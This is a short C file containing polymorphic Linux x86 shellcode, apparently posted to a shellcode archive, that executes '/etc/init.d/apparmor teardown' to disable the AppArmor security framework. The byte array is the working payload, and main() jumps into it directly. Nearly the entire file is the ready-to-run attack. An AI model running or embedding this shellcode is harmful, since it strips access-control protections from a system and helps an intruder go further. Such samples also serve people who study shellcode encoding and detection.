/* Title: Polymorphic apparmor teardown ( 69 bytes)
 * Author: pktmonky
 * Description: Polymorphic version of shell-storm linux x86 shellcode titled
 * '/etc/init.d/apparmor teardown' by John Babio.
 */


#include<stdio.h>
#include<string.h>
 
 
unsigned char buf[] =
"\x31\xdb\xf7\xe3\xeb\x1a\x5b\x89\x53\x14\x89\x53\x20\x89\x5b\x24"
"\x8d\x4b\x18\x89\x4b\x28\x8d\x4b\x24\x8d\x53\x20\xb0\x0b\xcd\x80"
"\xe8\xe1\xff\xff\xff\x2f\x65\x74\x63\x2f\x69\x6e\x69\x74\x2e\x64"
"\x2f\x61\x70\x70\x61\x72\x6d\x6f\x72\x58\x58\x58\x58\x74\x65\x61"
"\x72\x64\x6f\x77\x6e";
 
main()
{

    printf("Shellcode Length:  %d\n", strlen(buf));
 
    int (*ret)() = (int(*)())buf;
 
    ret();
 
}
